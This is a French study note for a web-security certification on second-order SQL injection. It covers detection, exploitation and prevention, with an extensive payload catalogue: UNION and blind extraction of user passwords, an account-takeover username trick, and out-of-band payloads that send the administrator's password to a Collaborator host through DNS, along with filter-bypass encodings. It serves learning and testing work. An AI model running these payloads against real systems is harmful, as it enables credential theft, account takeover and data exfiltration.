---
tags: [bscp, server-side, sql-injection]
niveau: practitioner
statut: en cours
---
# Second-order SQL injection

## En bref
- Une injection de premier ordre exploite une entrée de la requête HTTP qui se retrouve aussitôt dans une requête SQL non sécurisée. Dans une injection de second ordre, l'application stocke d'abord l'entrée, sans que rien ne se passe à cet endroit, puis la relit plus tard dans une autre requête et la colle dans une requête SQL de façon dangereuse. On parle aussi d'injection SQL stockée (ne pas confondre avec une procédure stockée, ni avec le XSS stocké).
- Le point d'entrée (où la charge utile est stockée) est distinct du point d'exécution (où elle est relue). La donnée n'est pas forcément dans une base : fichier, cache, session, en-tête journalisé ou file de tâches peuvent aussi la porter.
- La protection à l'insertion ne suffit pas : la valeur stockée reste dangereuse (voir la section suivante).
- La charge utile se construit pour la requête de relecture, pas pour celle d'insertion : type de colonne, guillemets autour de la valeur, moteur de base de données, verbe SQL (`SELECT`, `UPDATE`, `INSERT`, `DELETE`).
- Le signal peut venir d'une autre fonction, d'un autre utilisateur ou plus tard (administrateur, tâche différée).
- Un résumé court du principe existe dans [[SQL-injection]] (section Second-order) ; cette note est la référence détaillée.

> **Avertissement - risque d'écriture** : le second ordre aboutit souvent à un `UPDATE` ou à un `DELETE`. Une condition comme `OR '1'='1` placée dans un nom d'utilisateur relu par un changement de mot de passe modifierait **tous les comptes**. Même avertissement que dans [[SQL-injection]] (section Exemple d'attaque) : ne jamais l'utiliser sur une fonction qui écrit.

## Pourquoi les protections à l'entrée échouent

| Protection | Ce qu'elle évite | Pourquoi elle ne suffit pas |
|---|---|---|
| Requête paramétrée à l'insertion | Une injection au moment du stockage | La valeur est stockée telle quelle, apostrophe comprise : l'insertion est sûre, mais la donnée reste dangereuse quand elle est relue |
| Échappement à l'insertion (`'` devient `''`, ou `\'`) | La rupture de chaîne dans la requête d'insertion | La base défait l'échappement au stockage : la valeur relue contient de nouveau une apostrophe nue |
| Filtre ou pare-feu applicatif | Les entrées suspectes de la requête HTTP | Il ne voit que la requête d'entrée, jamais la seconde requête SQL |
| Validation sur le seul formulaire d'inscription | Les valeurs interdites à cet endroit | D'autres chemins écrivent dans la même colonne (import, API, administration) |

Elle apparaît quand l'insertion est protégée mais que la relecture ne l'est pas : les développeurs considèrent la donnée comme fiable puisqu'elle est déjà en base. Cette confiance est l'erreur.

## Conventions et légende
Conventions :
- `xyz` : valeur légitime du champ stocké (par exemple un nom d'utilisateur de test).
- `MARQ` : marqueur unique par essai (`zq7k1`, `zq7k2`, ...).
- `<CONDITION>` : condition testée.
- `COLLAB` : sous-domaine Burp Collaborator. OAST (out-of-band application security testing) désigne les techniques hors bande : la base déclenche une interaction DNS ou HTTP vers un serveur contrôlé. Les charges utiles hors bande sont décrites une seule fois dans [[Blind-SQL-injection]] (section Out-of-band).
- La charge utile est saisie dans le **point d'entrée** (inscription, profil, commentaire). Elle est exécutée au **point d'exécution** (changement de mot de passe, page de profil, export, tâche différée). Le contexte à respecter est celui du second point.
- Le dernier `'` n'est pas écrit quand la requête du second point le fournit. Quand le second point est un `UPDATE` ou un `INSERT ... VALUES (...)`, une forme équilibrée (finissant par `\|\|'`) évite de commenter la suite.
- `--` suivi d'un espace pour MySQL ; dans un formulaire, `+` doit être envoyé en `%2b` pour être stocké comme un plus ; `;` s'encode en `%3B` dans un cookie.
- Les `|` sont échappés en `\|` dans les tableaux.

Statuts :
- **Vérifié** : syntaxe certaine, ou documentée par la cheat sheet PortSwigger ou l'Academy. Cela ne veut pas dire rejoué : aucun payload de cette note n'a été rejoué (l'analyse n'a fait aucune requête). Les mentions entre parenthèses (syntaxe, principe de l'Academy) précisent la nature de la vérification.
- **À vérifier** : dépend du filtre, du moteur ou de l'application, ou doute de l'analyse.

## Types et variantes
Le schéma est toujours en deux temps : un point d'entrée où la charge utile est stockée, un point de déclenchement où elle est relue et exécutée. Les deux sont souvent à des endroits très différents de l'application.

Scénarios classiques (le verbe SQL est indicatif, à confirmer sur la cible) :

| Entrée stockée | Déclencheur | Verbe SQL probable | Signal | Catégorie du catalogue |
|---|---|---|---|---|
| Nom d'utilisateur à l'inscription | Changement de mot de passe | `UPDATE` | Le mot de passe d'un autre compte change | 3.5 |
| Adresse ou nom de profil | Facture, courriel ou export qui les réutilise | `SELECT` ou `INSERT` | Valeur copiée visible dans le document, ou erreur | 3.3, 3.5, 3.8 |
| Champ de profil | Page lue par un administrateur | `SELECT` | Pas de retour direct : temps ou interaction hors bande | 3.7, 3.9 |
| Commentaires ou titres | Recherche qui les relit | `SELECT` | Contenu affiché, erreur ou booléen | 3.3, 3.6 |
| En-têtes (`User-Agent`, `X-Forwarded-For`, `Referer`) | Page d'administration qui lit le journal | `INSERT` puis `SELECT` | Différé, souvent hors bande | 3.9 |
| Nom de fichier téléversé | Liste de fichiers ou tâche différée | `INSERT` puis `SELECT` | Variable | 3.2, 3.9 |
| Identifiant relu par « mot de passe oublié » | Fonction de récupération | `SELECT` ou `UPDATE` | Variable | 3.2, 3.6 |
| Préférences | Fonction qui les relit | À déterminer | Variable | 3.2 |
| Tâche différée | Exécution planifiée (nocturne) | À déterminer | Aucun retour immédiat | 3.9 |

Les points d'entrée en-têtes, nom de fichier multipart et `INSERT` suivi d'un affichage sont déjà catalogués dans [[SQL injection in different contexts]] (sections 3.4 et 3.5).

### Exemple détaillé
Cas classique : on crée un compte avec le nom d'utilisateur `admin'--`. L'inscription est paramétrée, le nom est stocké tel quel. Plus tard, la fonction de changement de mot de passe construit sa requête avec ce nom. Une requête réaliste vérifie aussi l'ancien mot de passe :

```sql
-- avant le commentaire : la vérification de l'ancien mot de passe est présente
UPDATE users SET password='nouveau' WHERE username='xyz' AND password='ancien'

-- avec le nom stocké admin'-- : la fin de la requête est commentée
UPDATE users SET password='nouveau' WHERE username='admin'--' AND password='ancien'
```

Le commentaire neutralise la vérification de l'ancien mot de passe, et c'est le mot de passe de `admin` qui change, pas le nôtre. La cible est le nom placé avant l'apostrophe : pour viser `administrator`, le nom stocké doit être exactement `administrator'--`.

Le déclenchement peut aussi dépendre d'une autre personne : un champ de profil lu par un administrateur dans son interface, un nom affiché dans un export, un rapport généré par une tâche planifiée. Dans ce cas on ne voit pas toujours le résultat soi-même (il peut aussi revenir dans la réponse, par exemple en copiant un secret dans un champ de profil, voir 3.5).

## Comment détecter
La réponse à la requête qui stocke la charge utile n'indique rien : elle est normale, puisque l'insertion est sûre. Il faut donc repérer les champs stockés puis les fonctions qui les réutilisent. Méthode en six étapes :
1. **Inventaire des champs** : lister toutes les données qu'on peut enregistrer (nom d'utilisateur, adresse, nom de profil, commentaire, titre, préférences, nom de fichier, en-têtes journalisés).
2. **Marqueurs** : placer un marqueur unique par champ (`zq7k1`, `zq7k2`, ...) et tenir à la main un registre : champ, marqueur, page ou fonction où il ressort.
3. **Forme stockée** : avant tout test, relire la valeur pour savoir ce qui survit au stockage (voir 3.1) : stockée telle quelle, doublée, échappée par une barre oblique inverse, tronquée, mise en minuscules.
4. **Déclencheurs** : parcourir les fonctionnalités qui relisent ces données : profil, mot de passe oublié, changement de mot de passe, historique, recherche, export, panneau d'administration, courriels, journaux, tâches différées.
5. **Comparaison `'` contre `''`** : erreur ou anomalie dans le second point avec une apostrophe, comportement normal avec deux (voir 3.2).
6. **Confirmation** : une condition vraie et une condition fausse donnent un résultat différent, de façon reproductible (même critère que dans [[SQL-injection]], section Comment détecter). Une différence isolée peut venir du bruit, d'une session expirée ou du cache.

Quand le déclenchement est invisible pour nous (côté administrateur, tâche différée), la détection hors bande avec Collaborator devient le meilleur outil. Utiliser un sous-domaine Collaborator distinct par champ, pour savoir quel champ a déclenché l'interaction.

## Comment exploiter (principe)
Trois étapes :
1. **Stocker** : placer la charge utile via le point d'entrée, en construisant son contexte d'après la requête du second point (type de colonne, guillemets, moteur, verbe SQL). `UNION` n'existe que dans un `SELECT` : identifier le verbe du second point avant de choisir la charge utile.
2. **Déclencher** : lancer la fonctionnalité qui relit la donnée.
3. **Lire le signal** : choisir la technique selon ce qu'on voit.

| Résultat visible au second point | Technique | Catalogue |
|---|---|---|
| Valeur affichée dans la page | Affichage direct avec `UNION` (`SELECT` uniquement) | 3.3, 3.4 |
| Valeur écrite dans un champ relisible | Copier un secret dans ce champ | 3.5 |
| Contenu qui change (une ligne ou aucune) | Aveugle booléen | 3.6 |
| Rien de visible, réponse mesurable | Temps | 3.7 |
| Erreur affichée ou erreur conditionnelle | Erreur | 3.8 |
| Second point invisible ou asynchrone | Hors bande | 3.9 |

Coût : deux requêtes par essai (stocker puis déclencher), et un marqueur nouveau à chaque essai à cause de l'unicité de la clé.

> **Avertissement - risque d'écriture** : si le second point est un `UPDATE` ou un `DELETE`, ne jamais utiliser `OR '1'='1` (tous les comptes seraient touchés). Un délai (`SLEEP`, `pg_sleep`) placé dans un `WHERE` est évalué pour chaque ligne lue (voir 3.7). Modifier le mot de passe de `administrator` coupe aussi l'accès de l'équipe à ce compte.

## Catalogue de payloads par catégorie
Les conventions et la légende sont en début de note. Pièges transversaux : un essai coûte deux requêtes (stocker puis déclencher) ; la clé (nom d'utilisateur) est unique, donc un marqueur différent par essai ; une charge utile d'écriture peut modifier d'autres lignes ; la forme stockée peut différer de la forme envoyée.

### 3.1 Identification de la charge utile stockée (la valeur survit-elle au stockage ?)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Marqueur neutre | `MARQ` (par exemple `zq7k1`) | Premier essai : retrouver la valeur dans toutes les pages et réponses, sans casser quoi que ce soit | Vérifié |
| Apostrophe isolée | `MARQ'` | Observer la forme affichée : `MARQ'` (stockée telle quelle), `MARQ''` (doublée), `MARQ\'` (échappée par barre oblique inverse), `MARQ` (supprimée) | Vérifié |
| Contrôle de longueur | `MARQ` suivi de 255 puis 256 puis 300 caractères `A` | Repérer la longueur maximale acceptée, la troncature silencieuse ou l'erreur ; relire la valeur affichée | Vérifié |
| Contrôle de normalisation | `MARQ`, `marq` (casse), `MARQ` avec un espace final, `MARQ` avec une tabulation | Savoir si la valeur est mise en minuscules, rognée, comparée sans casse | Vérifié |
| Contrôle Unicode | `MARQ＇` (apostrophe pleine chasse U+FF07) | Une normalisation Unicode de forme NFKC la convertirait en `'` après un filtre ; à comparer avec la forme relue | À vérifier |
| Contrôle des guillemets doubles | `MARQ"` | MySQL en mode ANSI_QUOTES, ou contexte d'identifiant | À vérifier |
| Contrôle du dollar | `MARQ$$` | PostgreSQL, guillemets dollar utilisables si l'apostrophe est neutralisée | À vérifier |

### 3.2 Détection avec marqueur (déclencheur : la fonction qui relit la donnée)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Erreur puis retour | `MARQ'` puis, sur un autre marqueur, `MARQ''` (ou `MARQ'` avec doublement manuel) | Erreur ou anomalie dans le second point avec une apostrophe, comportement normal avec deux | Vérifié |
| Concaténation neutre Oracle, PostgreSQL | `MARQ'\|\|'x` | Pas de changement visible si la valeur est concaténée dans une chaîne ; la comparaison avec `MARQx` change le résultat d'une recherche par égalité | À vérifier |
| Concaténation neutre SQL Server | `MARQ'+'x` | Idem, `+` envoyé en `%2b` dans un formulaire | À vérifier |
| Concaténation neutre MySQL | `MARQ' 'x` | Idem | À vérifier |
| Booléen vrai | `MARQ' AND '1'='1` | Second point en `SELECT` ou `UPDATE ... WHERE` : comportement identique à `MARQ` si la valeur existe | Vérifié |
| Booléen faux | `MARQ' AND '1'='2` | Même second point : résultat vide ou aucune ligne modifiée | Vérifié |
| Commentaire de fin | `MARQ'--` (MySQL : `MARQ'-- ` ou `MARQ'#`) | Retire la suite de la requête ; sur un `UPDATE` le compte visé est `MARQ` si le compte existe | Vérifié |
| Détection hors bande | voir 3.9 | Second point asynchrone ou invisible (administrateur, tâche différée) | Vérifié |

Pièges : le compte `MARQ` doit exister pour que la forme `MARQ'--` produise un effet observable sur un `UPDATE` ; un message d'erreur générique peut venir du filtre de l'inscription (comparer avec 3.1) et non de la base ; la différence doit se répéter (voir [[SQL-injection]], critère de confirmation).

### 3.3 Extraction par affichage direct (second point en SELECT dont le résultat est affiché)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Nombre de colonnes | `MARQ' ORDER BY 1--`, puis `2`, `3`... | Le nombre de colonnes de la requête du second point, pas du premier ; une erreur hors plage | Vérifié |
| Nombre de colonnes avec UNION | `MARQ' UNION SELECT NULL--` puis `NULL,NULL`... | Oracle : `FROM DUAL` obligatoire ; MySQL : `-- ` avec espace | Vérifié |
| Colonne de texte | `MARQ' UNION SELECT 'a',NULL,NULL--` (une colonne à la fois) | Chercher où `a` apparaît dans la page du second point | Vérifié |
| Version, SQL Server et MySQL | `MARQ' UNION SELECT @@version,NULL--` | Colonne de texte à la première position | Vérifié |
| Version, PostgreSQL | `MARQ' UNION SELECT version(),NULL--` | Idem | Vérifié |
| Version, Oracle | `MARQ' UNION SELECT banner,NULL FROM v$version--` | Idem | Vérifié |
| Lecture de la table des utilisateurs | `MARQ' UNION SELECT username,password FROM users--` | Deux colonnes de texte ; table et colonnes connues ; sinon énumération par `information_schema` (Oracle : `all_tables`, `all_tab_columns`) comme dans [[SQL-injection-Union-Attacks]] | Vérifié |
| Ligne isolée | Utiliser un nom qui ne correspond à rien comme préfixe : `nexiste_pas' UNION SELECT ...` | Évite que la ligne légitime masque la ligne injectée | Vérifié |

Pièges : la requête de relecture ne contient parfois qu'une ligne affichée (la page de profil lit un seul enregistrement) ; une colonne de texte non affichée ; un `LIMIT 1` retire la ligne injectée ; l'`UNION` est impossible si le second point est un `UPDATE` ou un `INSERT` (voir 3.5).

### 3.4 Concaténation sur une seule colonne

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Oracle, PostgreSQL | `MARQ' UNION SELECT NULL,username\|\|'~'\|\|password FROM users--` | Une seule colonne de texte (position à adapter) | Vérifié |
| SQL Server | `MARQ' UNION SELECT NULL,username+'~'+password FROM users--` | `+` envoyé en `%2b` dans un formulaire | Vérifié |
| MySQL | `MARQ' UNION SELECT NULL,CONCAT(username,'~',password) FROM users-- ` | Espace après `--` | Vérifié |
| Agrégation de toutes les lignes | MySQL : `GROUP_CONCAT(username,0x3a,password)` ; PostgreSQL et SQL Server : `STRING_AGG(username\|\|':'\|\|password,',')` (SQL Server : `+`) ; Oracle : `LISTAGG(...) WITHIN GROUP (ORDER BY username)` | Une seule ligne affichée ; voir les limites dans [[SQL-injection-Union-Attacks]] | Vérifié |

Piège propre au second ordre : la longueur du champ d'entrée limite la charge utile (voir 3.10). Réduire la requête : une seule colonne, pas d'agrégation, un filtre `WHERE username='administrator'`.

### 3.5 Second point en écriture (UPDATE, INSERT) : copier un secret dans un champ relisible

> **Avertissement** : ces charges utiles visent des fonctions qui écrivent. Ne jamais ajouter `OR '1'='1` dans un nom utilisé par un `UPDATE` ou un `DELETE` : tous les comptes seraient touchés.

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Copier une valeur, Oracle, PostgreSQL | `MARQ'\|\|(SELECT password FROM users WHERE username='administrator')\|\|'` | Le second point écrit la valeur dans un champ que l'on peut ensuite lire (nom affiché, adresse) ; sous-requête à une seule ligne | Vérifié (syntaxe) |
| Copier une valeur, SQL Server | `MARQ'+(SELECT password FROM users WHERE username='administrator')+'` | `+` envoyé en `%2b` | Vérifié (syntaxe) |
| Copier une valeur, MySQL | `MARQ',(SELECT password FROM users WHERE username='administrator'),'` dans un `INSERT ... VALUES ('...','...')`, ou `CONCAT` dans un `UPDATE` | Forme dépendante du nombre de colonnes de l'`INSERT` | À vérifier |
| Version dans un champ | `MARQ'\|\|(SELECT version())\|\|'` | Oracle : `(SELECT banner FROM v$version WHERE ROWNUM=1)` ; reprise de [[SQL injection in different contexts]] (section 3.5) | Vérifié (syntaxe) |
| Attaque du compte d'un autre utilisateur | Nom stocké `administrator'--` | `UPDATE users SET password='...' WHERE username='administrator'--' AND password='...'` : le mot de passe de `administrator` change | Vérifié (principe de l'Academy) |

Pièges : le type de la colonne cible doit accepter du texte ; si le champ est limité en longueur, la valeur copiée est tronquée ; une sous-requête qui renvoie plus d'une ligne produit une erreur.

### 3.6 Aveugle booléen (le signal est dans la page ou la réponse du second point)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Existence | `MARQ' AND (SELECT 'a' FROM users WHERE username='administrator')='a` | PostgreSQL, MySQL, SQL Server ; Oracle : ajouter `FROM dual` si pas de table | Vérifié |
| Longueur | `MARQ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>N)='a` | `LEN` sur SQL Server | Vérifié |
| Caractère | `MARQ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a` | Oracle : `SUBSTR` ; comparaison dépendante de la collation | Vérifié |
| Dichotomie | `MARQ' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='administrator'),1,1))>109--` | Oracle : `SUBSTR` ; MySQL : `-- ` | Vérifié |
| Condition de signal inversée | Observer quand le second point renvoie une ligne (vrai) ou aucune (faux) | Il faut un signal : contenu, nombre de lignes, message, code HTTP | Vérifié |

Pièges : un essai coûte deux requêtes ; il faut un marqueur nouveau pour chaque essai (unicité de la clé) ou un champ non unique (adresse, commentaire) ; dans Burp, enchaîner stocker puis déclencher avec une macro ou une règle de gestion de session, et ne pas lancer Intruder en parallèle. Sans réutilisation du même champ, prévoir un nombre élevé de comptes : prévenir l'opérateur avant de créer des centaines d'enregistrements.

### 3.7 Aveugle par le temps

> **Avertissement - délai évalué par ligne** : dans un `UPDATE` ou un `DELETE`, un `SLEEP` placé dans un `WHERE` est évalué pour chaque ligne lue (table de 50 lignes et délai de 5 secondes : 250 secondes, avec risque d'expiration). Utiliser un délai de 1 à 2 secondes, ou une condition qui ne s'évalue que pour la ligne visée.

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Oracle, délai simple | `MARQ'\|\|dbms_pipe.receive_message(('a'),5)--` | Délai au déclenchement, pas à l'inscription | Vérifié |
| PostgreSQL, délai simple | `MARQ'\|\|pg_sleep(5)--` | Équilibré : `MARQ'\|\|pg_sleep(5)\|\|'` | Vérifié |
| PostgreSQL, conditionnel | `MARQ'\|\|(SELECT CASE WHEN (<CONDITION>) THEN pg_sleep(5) ELSE pg_sleep(0) END)\|\|'` | Équilibré, sans requête empilée | Vérifié |
| SQL Server, délai simple | `MARQ'; WAITFOR DELAY '0:0:5'--` | Requête empilée acceptée par l'interface | Vérifié |
| SQL Server, conditionnel | `MARQ'; IF (<CONDITION>) WAITFOR DELAY '0:0:5'--` | Requête empilée | Vérifié |
| MySQL, conditionnel | `MARQ' AND IF(<CONDITION>,SLEEP(5),0)-- ` | Le délai n'a lieu que si une ligne est lue (comme dans [[Blind-SQL-injection]], piège MySQL de la section Time-based) | Vérifié |

Pièges : si le second point est une tâche différée, le déclencheur ne montre aucun délai (passer à 3.9) ; mesurer d'abord le bruit (voir [[Blind SQLi - Triggering time delay]]).

### 3.8 Erreur (conditionnelle ou visible)

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Oracle, conditionnel | `MARQ'\|\|(SELECT CASE WHEN (<CONDITION>) THEN TO_CHAR(1/0) ELSE NULL END FROM dual)\|\|'` | Erreur seulement si la condition est vraie | Vérifié |
| PostgreSQL, conditionnel | `MARQ' AND 1=(SELECT CASE WHEN (<CONDITION>) THEN 1/(SELECT 0) ELSE NULL END)--` | Idem | Vérifié |
| SQL Server, conditionnel | `MARQ' AND 1=(SELECT CASE WHEN (<CONDITION>) THEN 1/0 ELSE NULL END)--` | Idem | Vérifié |
| MySQL, conditionnel | `MARQ' AND (SELECT IF(<CONDITION>,(SELECT table_name FROM information_schema.tables),'a'))='a'-- ` | La sous-requête à plusieurs lignes provoque l'erreur | À vérifier |
| Erreur visible, conversion | `MARQ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--` | PostgreSQL ; message qui cite la valeur ; SQL Server : `TOP 1` à la place de `LIMIT 1` | Vérifié |
| Erreur visible, MySQL | `MARQ' AND EXTRACTVALUE(1,CONCAT(0x5c,(SELECT password FROM users LIMIT 1)))-- ` | Messages d'erreur affichés ; troncature du message | À vérifier |

Pièges : l'erreur apparaît dans la réponse du second point, ou seulement dans les journaux serveur (aucun signal visible) ; un message générique peut venir du filtre ; détail et limites dans [[Error-based SQL Injection]].

### 3.9 Hors bande (second point invisible ou asynchrone)
Les charges utiles hors bande sont décrites une seule fois dans [[Blind-SQL-injection]] (section Out-of-band). Pour le second ordre, elles se placent dans le champ stocké sous une forme équilibrée.

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| SQL Server, résolution DNS | `MARQ'; exec master..xp_dirtree '//COLLAB/a'--` | Requête empilée, droits suffisants | Vérifié |
| Oracle, version non corrigée | `MARQ'\|\|(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB/"> %remote;]>'),'/l') FROM dual)\|\|'` | Version non corrigée ; correctif dépendant de la version | Vérifié |
| Oracle, base corrigée | `MARQ'\|\|(SELECT UTL_INADDR.get_host_address('COLLAB') FROM dual)\|\|'` | Privilèges élevés | À vérifier |
| PostgreSQL | `MARQ'; copy (SELECT '') to program 'nslookup COLLAB'--` | Privilèges élevés, requête empilée | À vérifier |
| Exfiltration dans le sous-domaine | Insérer `(SELECT password FROM users WHERE username='administrator')` dans le nom d'hôte | Caractères valides pour un nom DNS, étiquette de 63 caractères au plus | Vérifié |

Pièges : interaction qui arrive tard (tâche nocturne, revue par un administrateur) : relancer l'interrogation de Collaborator, ne pas conclure trop tôt ; le serveur de base peut ne pas avoir de sortie réseau ; l'interaction peut venir d'un autre composant (analyse antivirus, aperçu de lien).

### 3.10 Contraintes : longueur, troncature, normalisation, doublons de clés

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Raccourcir la charge utile | `x'--`, `x'\|\|pg_sleep(5)--` (Oracle : `x'\|\|dbms_pipe.receive_message(('a'),5)--`) | Champ limité à n caractères : la charge utile minimale suffit à prouver | Vérifié |
| Troncature de colonne (MySQL non strict) | `administrator` suivi de 50 espaces puis `x`, avec une colonne plus courte que la valeur | MySQL sans le mode strict : la valeur est coupée en silence ; la comparaison ignore les espaces finaux (collation de remplissage par espaces) ; l'enregistrement prend l'identité de `administrator` | À vérifier |
| Doublon de clé | `MARQ1`, `MARQ2`, ... | Contrainte d'unicité sur le nom : un marqueur nouveau par essai, y compris pour les charges utiles | Vérifié |
| Doublon de casse | `Administrator` à la place de `administrator` | Comparaison insensible à la casse (MySQL, SQL Server) : l'inscription est refusée comme doublon | À vérifier |
| Découpage de la charge utile | Répartir sur deux champs (par exemple prénom et nom) si l'application les concatène | Le second point concatène plusieurs champs stockés | À vérifier |

### 3.11 Échappement à l'insertion et contournement

| Usage | Payload | Condition d'usage | Statut |
|---|---|---|---|
| Échappement non neutralisant (cas classique) | `xyz'--` | L'application échappe l'apostrophe en `''` dans une requête non paramétrée : la base stocke `xyz'--` (un seul `'`), la relecture la rend dangereuse | Vérifié (principe de l'Academy) |
| Double échappement | Si la forme relue contient `''` ou `\'` | La valeur est stockée déjà échappée : l'apostrophe ne ferme plus la chaîne ; essayer un autre champ ou un autre chemin d'écriture | Vérifié |
| Barre oblique inverse (MySQL) | `xyz\` | Échappement par barre oblique inverse en MySQL : la barre peut neutraliser l'apostrophe de fermeture | À vérifier |
| Caractères sans apostrophe, PostgreSQL et Oracle | `CHR(97)\|\|CHR(100)\|\|...` | Apostrophe filtrée ou échappée : construire les chaînes sans guillemets | Vérifié (syntaxe) |
| Caractères sans apostrophe, SQL Server | `CHAR(97)+CHAR(100)+...` | Idem | Vérifié (syntaxe) |
| Caractères sans apostrophe, MySQL | `0x61646d696e` ou `CHAR(97,100,109,105,110)` | Idem | Vérifié (syntaxe) |
| Guillemets dollar | `$$administrator$$` | PostgreSQL, apostrophe inutilisable ; le signe dollar peut être altéré par l'application | À vérifier |
| Apostrophe pleine chasse | `xyz＇--` | Normalisation Unicode NFKC appliquée après le filtre | À vérifier |
| Encodage multioctet (GBK) | `%bf%27` | Jeu de caractères multioctet côté connexion avec échappement par barre oblique inverse ; rare | À vérifier |

Pièges : l'échappement d'entrée est parfois appliqué à deux endroits (formulaire et API) : tester les deux ; ne jamais conclure qu'un champ est sûr sans avoir relu sa forme stockée (3.1).

## Pièges et points d'attention BSCP
Pièges propres au second ordre. Les pièges communs à toutes les variantes sont dans [[SQL-injection]] (section Pièges et points d'attention BSCP).
- La charge utile doit survivre au stockage. Une limite de longueur sur le champ, un filtre à l'inscription ou une normalisation (casse, espaces finaux, Unicode) peuvent la tronquer ou la modifier, et elle ne marchera pas au moment de la relecture. Relire la forme stockée avant de tester (3.1).
- On teste le mauvais endroit si on s'attend à une réaction immédiate. Rien ne se passe à l'insertion, c'est normal.
- Se placer dans le contexte de la requête qui lit la donnée. Identifier d'abord le verbe SQL du second point (`SELECT`, `UPDATE`, `INSERT`, `DELETE`) : `UNION` n'existe que dans un `SELECT`, et dans un `UPDATE` il faut penser à ce qu'on modifie vraiment (l'exemple du mot de passe d'un autre compte).
- Risque d'écriture : `OR '1'='1` sur un `UPDATE` ou un `DELETE` touche toutes les lignes (voir l'avertissement en tête de note et [[SQL-injection]]).
- Délai évalué par ligne dans un `UPDATE` ou un `DELETE` (3.7).
- Unicité de la clé : un marqueur différent par essai, charges utiles comprises.
- Coût de deux requêtes par essai en aveugle ; prévenir l'opérateur avant de créer des centaines d'enregistrements.
- Troncature en mode non strict de MySQL et comparaison avec espaces finaux (3.10).
- Forme stockée différente de la forme envoyée : valeur doublée, échappée ou mise en minuscules.
- Effets de bord sur un compte réel : verrouillage de compte, et modifier le mot de passe de `administrator` coupe l'accès de l'équipe.
- Impact sur d'autres utilisateurs : l'administrateur qui relit déclenche la charge utile dans sa session. En mission, limiter aux fonctions inoffensives (délai, résolution DNS).
- Le délai entre le stockage et l'exécution peut être long (tâche nocturne, revue par un administrateur). Protocole : relancer le déclencheur, attendre un cycle, surveiller Collaborator, et ne pas conclure trop vite à l'absence de faille.
- Tester tous les champs enregistrables, y compris ceux qu'on ne pense pas à regarder (préférences, nom d'un fichier, métadonnées).
- Après un test, penser au nettoyage : un compte ou un enregistrement piégé reste en base et peut se déclencher plus tard, y compris en mission réelle. Supprimer ou renommer le compte piégé, ou indiquer à l'opérateur ce qui reste en base.

## Prévention
Les requêtes paramétrées doivent s'appliquer partout, y compris quand la valeur vient de la base de données. Une donnée stockée n'est pas fiable pour autant : elle vient à l'origine d'un utilisateur. Il faut donc traiter chaque donnée relue comme une entrée non fiable, et ne jamais construire une requête par concaténation, quelle que soit la source de la valeur.

Propre au second ordre :
- L'échappement manuel (doubler les apostrophes) n'est pas une défense : c'est une cause directe du second ordre.
- Paramétrer aussi les requêtes de lecture et de mise à jour, les tâches planifiées, les exports et les procédures stockées qui concatènent (voir [[SQL-injection]], section Prévention).
- Identifiants et `ORDER BY` : liste de valeurs autorisées.
- Contraintes de base : longueur de colonne cohérente avec l'application, mode strict de MySQL activé, unicité et normalisation (casse, espaces, Unicode) appliquées avant l'insertion et à la comparaison.
- Moindre privilège : compte de base distinct pour les tâches différées, sans fonctions réseau ni lecture de fichiers ; flux sortants filtrés (voir [[Blind-SQL-injection]], section Prévention).
- Revue de code : rechercher toute concaténation dont la valeur vient de la base, pas seulement de la requête HTTP ; tests automatisés qui stockent une apostrophe puis rejouent chaque fonction qui relit le champ.
- Journalisation : alerter sur les erreurs SQL dans les fonctions de relecture.

## Labs PortSwigger
Aucun lab dédié au second ordre n'est connu : à confirmer par l'opérateur 

- [ ] Apprentice
- [ ] Practitioner
- [ ] Expert

Labs des techniques d'exploitation, tels que relevés dans les autres notes (l'opérateur n'a pas confirmé leur réalisation ; cases non reprises ici) :
- [[SQL-injection]] : Apprentice coché le 2026-10-26 ; Practitioner et Expert non cochés (données cachées dans la clause WHERE, contournement de connexion).
- [[SQL-injection-Union-Attacks]] : Apprentice coché le 2026-10-26, Practitioner coché le 2026-10-27, Expert non coché.
- [[Blind-SQL-injection]] : sept labs cochés le 2026-11-02, tous de niveau Practitioner d'après l'agent (liste et moteurs non revérifiés en ligne) : réponses conditionnelles, erreurs conditionnelles, erreur visible, délais, délais avec récupération d'information, interaction hors bande, exfiltration hors bande.
- [[Blind SQLi - Triggering time delay]] : Practitioner coché le 2026-11-02 ; Apprentice et Expert non cochés.
- [[Error-based SQL Injection]] : Practitioner coché le 2026-11-02 (erreurs conditionnelles) ; Apprentice et Expert non cochés.
- [[SQL injection in different contexts]] : aucune case cochée ; lab de contournement de filtre par encodage XML signalé « à confirmer par l'opérateur ».

## Journal des labs
Aucun lab de second ordre n'a été fait pour l'instant. 

```markdown
### Lab: <titre exact PortSwigger>
- **Énoncé** : (2 à 3 lignes en français)
- **Moteur et variante** : (Oracle, PostgreSQL... ; conditionnelle, erreur, délai ou OAST)
- **Signal observé** : (contenu, erreur, temps ou interaction)
- **Méthode** :
	1.
- **Payloads clés** (exacts) :
	- `...`
- **Pièges rencontrés** :
- **Statut et date** :
```

## Liens
- [[SQL-injection]]
- [[SQL-injection-Union-Attacks]]
- [[Blind-SQL-injection]]
- [[Error-based SQL Injection]]
- [[SQL injection in different contexts]]
- [[Blind SQLi - Triggering time delay]]
- [[Payloads-cheatsheet]]
- https://portswigger.net/web-security/sql-injection (page « Second-order SQL injection »)
- https://portswigger.net/web-security/sql-injection/cheat-sheet
